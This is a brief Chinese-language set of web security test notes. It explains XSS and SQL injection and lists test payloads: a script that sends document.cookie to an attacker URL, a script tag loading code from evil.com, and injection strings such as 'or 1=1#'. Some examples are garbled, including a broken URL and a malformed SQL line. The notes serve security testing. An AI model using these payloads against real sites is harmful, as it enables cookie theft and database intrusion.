# 为Web应用添加安全性防护策略







## xss测试用例

1. xss攻击：跨站脚本攻击。是指攻击者在嵌入客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击的目的。如获取用户的cookie，导航到恶意网站，携带木马等。

2. xss攻击危害：

   1. 可以盗取各类用户账号。

     2. 控制数据

   2. 强行发送电子邮件

   3. 控制受害者及其向其他网站发起攻击

3、测试用例：

1. `<script>alert(1);</script>`

2. 反射类漏洞测试：

   `<form method="get"></form>` 即将提交表单改为get方式提交来获取用户名和密码。

  3、存储式漏洞：

​	`<Script>window.location.href='http://www. .com'/?cookie'+document.cookie</script>`

​	此用例用于截获cookie信息，黑客可以将攻击脚本上传到web服务器上，是的所有访问该页面的    用户都面临信息泄露。此用例用于获取用户的cookie信息到黑客自己的网站上。

 4、`<script src="http://www.evil.com/file.js"></script>` 

​	运行黑客写的js脚本。

## sql注入

1、所谓的sql注入，就是将sql命令插入到web表单提交到后台，最终达到欺骗服务器执行恶意的sql命令。

2、测试用例：

​	(1)   `<select * from user where username="or 1=1#"and password=md5("")`  将后面的sql条件注释掉

​	(2)`and 2=2`

​	(3)`and (select count(*) from sysobjects)>0`  



